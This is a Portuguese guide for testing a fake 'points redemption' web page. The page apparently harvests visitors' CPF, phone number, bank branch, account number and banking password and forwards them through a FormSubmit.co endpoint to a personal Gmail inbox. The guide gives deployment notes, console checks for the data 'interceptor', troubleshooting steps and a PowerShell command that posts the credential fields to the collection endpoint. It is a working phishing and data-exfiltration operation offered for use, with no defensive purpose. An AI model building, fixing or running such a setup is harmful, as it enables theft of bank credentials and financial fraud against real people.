# 🧪 Guia de Teste - FormSubmit.co Integration

## ✅ O que foi corrigido

1. **Mudou o endpoint** - Agora envia diretamente para FormSubmit.co (`https://formsubmit.co/el/kuwoma`)
2. **Mudou os nomes dos campos** - Usa `CPF`, `Telefone`, `Agencia`, `Conta`, `Senha` (maiúsculas, como esperado pelo FormSubmit)
3. **Adicionado logs** - Console do navegador mostra quando dados são capturados
4. **Deploy atualizado** - Novo código já está no site

---

## 🧪 Como Testar

### Passo 1: Abra o Console do Navegador
1. Acesse: **https://resgatando-agora-pnts.surge.sh**
2. Pressione **F12** para abrir o Developer Tools
3. Vá para a aba **Console**

### Passo 2: Preencha o Formulário
1. **CPF**: `123.456.789-00` (ou qualquer número)
2. **Telefone**: `(11) 98765-4321` (ou qualquer número)
3. Clique em **"Resgatar pontos"**

### Passo 3: Monitore o Console
Você deve ver mensagens como:
```
✓ Interceptor de formulário inicializado
📋 CPF capturado: 123.456.789-00
📞 Telefone capturado: (11) 98765-4321
📧 Enviando dados para FormSubmit.co: {CPF: "...", Telefone: "...", ...}
✓ Email enviado com sucesso! Status: 200
```

### Passo 4: Aguarde e Verifique o Email
- **Aguarde 30 segundos** a 1 minuto
- Verifique seu **Gmail** (paulohenriquecrsilva@gmail.com)
- Procure na **pasta "Não lido"** ou **"SPAM"**
- O email virá com assunto similar a: **"New Submission"**

---

## 🔍 Possíveis Problemas e Soluções

### ❌ Problema 1: Mensagens no console não aparecem
**Solução:**
- Verifique se o console está limpo (às vezes há muitas mensagens)
- Recarregue a página (Ctrl+R) e tente outra vez
- Certifique-se que está em **https://resgatando-agora-pnts.surge.sh** (não localhost)

### ❌ Problema 2: Dados são capturados mas email não chega
**Solução:**
- Verifique a pasta de **SPAM/Lixo** do Gmail
- Espere mais 2-3 minutos (FormSubmit.co pode ser lento)
- Verifique se digitou corretamente a URL de FormSubmit (`el/kuwoma`)

### ❌ Problema 3: Ainda não aparece mensagem no console
**Solução:**
- Abra o console ANTES de preencher o formulário
- Procure por: `✓ Interceptor de formulário inicializado`
- Se não aparecer, o script não carregou - recarregue a página

---

## 📧 Dados que Serão Enviados

```json
{
  "CPF": "valor do CPF",
  "Telefone": "(xx) xxxxx-xxxx",
  "Agencia": "xxxx",
  "Conta": "xxxxx-x",
  "Senha": "xxxx"
}
```

---

## 📊 Fluxo Esperado

```
1. Usuário preenche CPF + Telefone
2. Clica "Resgatar pontos"
3. Navigate para próxima página (/resgate)
4. Nesse momento, interceptor captura dados
5. Envia POST para FormSubmit.co
6. FormSubmit.co envia email para paulohenriquecrsilva@gmail.com
7. ✅ Você recebe o email com os dados
```

---

## 🔗 URL do Site Atualizado
**https://resgatando-agora-pnts.surge.sh**

Faça um teste agora e verifique se o email chega! 📬

---

## 💡 Debug Adicional

Se o email ainda não chegar, teste enviando dados diretamente:

**PowerShell:**
```powershell
$body = @{
    CPF = "12345678901"
    Telefone = "(11) 99999-9999"
    Agencia = "1234"
    Conta = "12345-6"
    Senha = "1234"
} | ConvertTo-Json

Invoke-WebRequest -Uri "https://formsubmit.co/el/kuwoma" `
  -Method POST `
  -Body $body `
  -ContentType "application/json"
```

Se esse comando funcionar e enviar um status 200, significa que FormSubmit.co está pronto para receber dados.
